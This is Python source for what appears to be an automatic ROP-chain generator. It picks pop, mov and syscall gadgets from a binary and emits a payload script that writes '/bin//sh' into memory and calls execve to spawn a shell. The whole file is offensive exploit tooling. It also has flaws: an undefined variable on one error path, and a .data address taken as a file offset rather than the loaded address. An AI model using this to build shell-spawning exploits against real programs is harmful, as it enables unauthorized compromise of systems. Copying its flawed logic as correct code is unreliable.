import struct
import sys
import re

REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
            ]

def operands(csinsn):
    return csinsn.op_str.split(', ')

def writeGadget(fd, gadget):
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(gadget[0].address)))
    fd.write(")")
    fd.write("\t\t# " + str(gadget))
    fd.write("\n\t")
    

def LoadConstIntoReg(GadgetList, Reg, Const, fd) : 

    RegList = queryGadgets(GadgetList, Reg)
   
    # Search for "pop Reg; ret"
    for gadget in RegList: 
        inst = gadget[0]

        if inst.mnemonic == "pop" : 

            # "pop Reg; ret" is found
            # Steps to be taken: 
            #   1. Put Const onto stack
            #   2. Execute "pop Reg; ret"

            # Write it into the file
            
            # Write address of "pop Reg; ret"
            writeGadget(fd, gadget)
        
            # Write Const onto stack
            fd.write("payload += struct.pack('<Q', ")
            fd.write(str(hex(Const)))
            fd.write(")")
            fd.write("\n\t")
            
            return
        
  
    # Search for "xor Reg, Reg; ret"
    # x = 0
    # while x < len(RegList) : 
        
    #    gadget = RegList[x]
    #    inst = gadget[0]
       
    #    if inst['mnemonic'] == "xor" : 
            # "xor Reg, Reg; ret" is found
            # Loads 0 into Reg
            # Jackpot!
            # Steps to do: 
            #   1. Execute "xor Reg, Reg; ret"
            #   2. Call changeRegValue if Const != 0

            # Write it into the file
    #        fd.write("payload += struct.pack('<Q', ")
    #        fd.write(hex(int(inst['address'])))
    #        fd.write(")")
    #        fd.write("\t\t# Address of 'xor Reg, Reg; ret'")
    #        fd.write("\n\t")
    
    print("Unable to find necessary gadgets to load a value into register " + reg)
    print("Exiting...")
    sys.exit()

# From the gadgets, this routine will return a list of gadgets that contain the target register as an operand.
def queryGadgets(GadgetList, targetReg):
    L = GadgetList
    ReturnList = list()

    for gadget in L:
        inst = gadget[0]

        if targetReg in operands(inst): 
            ReturnList.append(gadget)
    
    return ReturnList

def getPopGadgets(Gadgets):
    popGadgets = list()

    for gadget in Gadgets:
        if len(gadget) == 2:
            if gadget[-2].mnemonic == 'pop':
                popGadgets.append(gadget)

    return popGadgets

def getMovQwordGadgets(Gadgets):
    movQwordGadgets = list()
    
    for gadget in Gadgets:
        if len(gadget) == 2 and gadget[-2].mnemonic == 'mov':
                ops = operands(gadget[-2])
                if re.search("^qword ptr \\[[a-z]+\\]$", ops[0]) and ops[1] in REGISTERS:
                    movQwordGadgets.append(gadget)
    
    return movQwordGadgets

def canWrite(movQwordGadgets, popGadgets):
    for gadget in movQwordGadgets:
        if len(gadget) != 2: continue
        ops = operands(gadget[-2])
        op1 = ops[0][-4:-1]
        op2 = ops[1]
        f1 = 0
        f2 = 0
        pop1 = None
        pop2 = None
        for popGadg in popGadgets:
            if operands(popGadg[0])[0] == op1:
                f1 =1
                pop1 = popGadg
                break
        for popGadg in popGadgets:
            if operands(popGadg[0])[0] == op2:
                f2 =1
                pop2 = popGadg
                break
        if(f1 and f2):
            return [gadget, pop1, pop2] # returns [ mov qword ptr [rega], reb, pop rega, pop regb ] 
    return list()

def WriteStuffIntoMemory(GadgetList, data, addr, fd) : 

    popGadgets = getPopGadgets(GadgetList) #TODO use LoadConstIntoReg
    movQwordGadgets = getMovQwordGadgets(GadgetList)
    movpopGadgets = canWrite(movQwordGadgets, popGadgets)

    if len(movpopGadgets) == 0: 
        print("Didn't find gadgets necessary to write stuff into memory")
        print("ROP Chaining failed")
        sys.exit()

    movGadget = movpopGadgets[0]
    popGadget1 = movpopGadgets[1]
    popGadget2 = movpopGadgets[2]
   
    count = 0
    while len(data) > 0 : 

        if len(data) <= 8: 
            data_piece = data
            data = ''
        
        else : 
            data_piece = data[:8]
            data = data[8:]

        # Execute popGadget1 => Reg1 will have .data's address
        writeGadget(fd, popGadget1)

        # Put .data's address onto stack
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(addr)))
        fd.write(")")
        fd.write("\t\t# Address of .data section")
        fd.write("\n\t")
        addr = addr + 8

    
        # Execute popGadget2 => Reg2 will have "/bin/sh"
        writeGadget(fd, popGadget2)

        # Put "/bin//sh" into stack
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int.from_bytes(data_piece, byteorder = 'little')))
        fd.write(")")
        # fd.write("\t\t# ascii of '/bin//sh'")
        fd.write("\n\t")

        # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
        writeGadget(fd, movGadget)

def checkIfSyscallPresent(GadgetList) : 

    syscallList = list()

    x = 0
    for gadget in GadgetList:
        if len(gadget) != 1: continue # We're only interested in bare syscall right now.
        inst = gadget[0]
        if inst.mnemonic == "syscall": 
            syscallList.append(gadget)
        
    
    return syscallList

def writeHeader(fd) : 

    fd.write("#!/usr/bin/env python2")
    fd.write("\n\n")
    fd.write("import struct")
    fd.write("\n\n")
    fd.write("if __name__ == '__main__' : ")
    fd.write("\n\n\t")
    fd.write("# Enter the amount of junk required")
    fd.write("\n\t")
    fd.write("payload = ''")
    fd.write("\n\n\t")

def writeFooter(fd): 

    fd.write("\n\t")
    fd.write("fd = open('payload.txt', 'wb')")
    fd.write("\n\t")
    fd.write("fd.write(payload)")
    fd.write("\n\t")
    fd.write("fd.close()")    
    fd.write("\n\t")
    fd.close()

def execveROPChain(GadgetList, elf): 

    print("\n\n-->Chaining to get a shell using execve system call")
    """ Get a section from the file, by name. Return None if no such
            section exists.
    """
    data_section_addr = elf.getWritableDataSegments()[0].offset_in_elf #TODO: Should be offset in loaded image

    syscallList1 = checkIfSyscallPresent(GadgetList)
    
    # if syscall is found, 
        # rax <- 59
        # rdi <- Address of "/bin/sh"
        # rsi <- 0
        # rdx <- 0
        # syscall
    
    if len(syscallList1) > 0: 
        execve_bin_sh(GadgetList, data_section_addr)
        sys.exit()

    print("--> No syscall => ROP Chaining failed")
    sys.exit()

def execve_bin_sh(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("execveROPChain.py", "w")
    writeHeader(fd)
    
    # Step-2: Writing "/bin//sh" into .data section
    binsh = 0x68732f2f6e69622f
    binsh = struct.pack('<Q', binsh)
    WriteStuffIntoMemory(GadgetList, binsh, data_section_addr, fd)
 
    # Step-1: rax <- 59
    LoadConstIntoReg(GadgetList, "rax", 59, fd)

	# Step-3: rdi <- "Address of /bin//sh" - .data section's address
    LoadConstIntoReg(GadgetList, "rdi", data_section_addr, fd)

	# Step-4: rsi <- 0
    LoadConstIntoReg(GadgetList, "rsi", 0, fd)

    # Step-5: rdx <- 0
    LoadConstIntoReg(GadgetList, "rdx", 0, fd)


    # Get syscall
    syscallList = checkIfSyscallPresent(GadgetList)
    if len(syscallList) == 0: 
        print("No syscall gadget found.")
        sys.exit()
    
    else : 
        syscallGadget = syscallList[0]
        syscallDict = syscallGadget[0]
        syscallAddress = syscallDict.address
    
    writeGadget(fd, syscallGadget)
    
    writeFooter(fd)
    print("-->Written the complete payload in execveROPChain.py")
    print("-->Chaining successful!")
